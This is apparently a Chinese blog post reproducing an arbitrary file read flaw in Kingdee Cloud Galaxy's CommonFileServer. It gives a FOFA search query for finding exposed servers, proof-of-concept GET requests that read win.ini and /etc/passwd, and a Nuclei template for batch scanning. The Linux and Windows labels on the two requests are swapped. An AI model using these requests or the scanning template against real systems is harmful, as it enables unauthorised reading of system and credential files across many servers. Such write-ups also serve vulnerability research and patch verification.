# 原创
：  漏洞复现--金蝶云星空 CommonFileServer 任意文件读取

# 漏洞复现--金蝶云星空 CommonFileServer 任意文件读取

## 免责声明：

**文章中涉及的漏洞均已修复，敏感信息均已做打码处理，文章仅做经验分享用途，切勿当真，未授权的攻击属于非法行为！文章中敏感信息均已做多层打马处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任，一旦造成后果请自行负**

### 一：漏洞描述

金蝶云星空是金蝶集团面向大中型企业的一个核心产品，聚焦多组织，多利润中心的企业。它以“开放、标准、社交”三大特性为数字经济时代的企业提供开放的ERP云平台。该产品CommonFileServer存在任意文件读取漏洞。

### 二：漏洞影响版本

金蝶云星空

### 三：网络空间测绘查询

fofa:<br/> `title="金蝶云星空 管理中心"`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/75e191c8727e27f9c39b4cfb1a154247.jpeg"/>

### 四：漏洞复现

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/c0e0fca13c8c5bddd6c792fe665267af.jpeg"/><br/> POC:<br/> liunx：<br/> `GET /CommonFileServer/c:/windows/win.ini`<br/> Windows：<br/> `GET /CommonFileServer/etc/passwd`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/3deb8786b8c4c5e00647711337829f52.jpeg"/>

### 五：批量检测

```
id: kingdee-CommonFileServer-readfile
info:
  name: kingdee-CommonFileServer-readfile
  author: kingdee-CommonFileServer-readfile
  severity: medium
  tags: app="金蝶云星空-管理中心"

http:
  - raw:
      - |
        GET /CommonFileServer/c:/windows/win.ini HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
        Connection: close
      
      - |
        GET /CommonFileServer/etc/passwd HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
        Connection: close

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'root:'
          - 'support'
        condition: or
      - type: status
        status:
          - 200

```
